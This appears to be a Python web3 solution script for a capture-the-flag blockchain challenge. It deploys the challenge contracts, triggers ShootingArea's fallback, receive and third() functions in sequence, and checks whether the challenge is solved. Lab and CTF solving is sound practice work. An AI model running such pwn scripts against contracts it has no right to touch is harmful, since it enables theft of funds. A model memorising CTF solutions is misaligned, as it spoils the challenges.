from web3 import Web3, AsyncWeb3
import os
from src.util import deploy_contract, transact_dict, check_targets

CONTRACTS_PATH = "smartContracts"


def blockchain_pwn(web3: Web3, setup_contract_addr: str = None):
    """Pwn the blockchain box.
    If setup_contract_addr is provided, the contract is not deployed but
    instanciated.

    Args:
        web3 (Web3): A connected web3 instance
        setup_contract_addr (str, optional): The address of the setup contract. Defaults to None.
    """
    is_con = web3.is_connected()
    print("\nConnected to the blockchain? ", is_con)

    account = web3.eth.default_account
    balance = web3.eth.get_balance(account)
    print("Account: ", account)
    print("Balance: ", web3.from_wei(balance, "ether"), "$ether")

    setup_contract = deploy_contract(
        web3,
        os.path.join(CONTRACTS_PATH, "Setup.sol"),
        CONTRACTS_PATH,
        account,
        setup_contract_addr,
    )
    print("Setup.sol deployed to: ", setup_contract.address)

    # Get the address of the nested target contract
    target_addr = setup_contract.functions.TARGET().call()
    print("TARGET address instance of ShootingArea.sol: ", target_addr)

    target_contract = deploy_contract(
        web3,
        os.path.join(CONTRACTS_PATH, "ShootingArea.sol"),
        CONTRACTS_PATH,
        account,
        target_addr,
    )
    check_targets(target_contract)

    # Fitst target
    tx_fallback = web3.eth.send_transaction(
        {"to": target_contract.address, "from": account, "data": "0x0"}
    )
    web3.eth.wait_for_transaction_receipt(tx_fallback)
    check_targets(target_contract)

    # Second target
    tx_receive = target_contract.receive().transact(transact_dict(web3, account))
    web3.eth.wait_for_transaction_receipt(tx_receive)
    check_targets(target_contract)

    # Third target
    tx_third = target_contract.functions.third().transact(transact_dict(web3, account))
    web3.eth.wait_for_transaction_receipt(tx_third)
    check_targets(target_contract)

    # Check the flag
    flag = setup_contract.functions.isSolved().call()
    print("\nBlocqchain Box pwned? ", "✅" if flag else "❌")
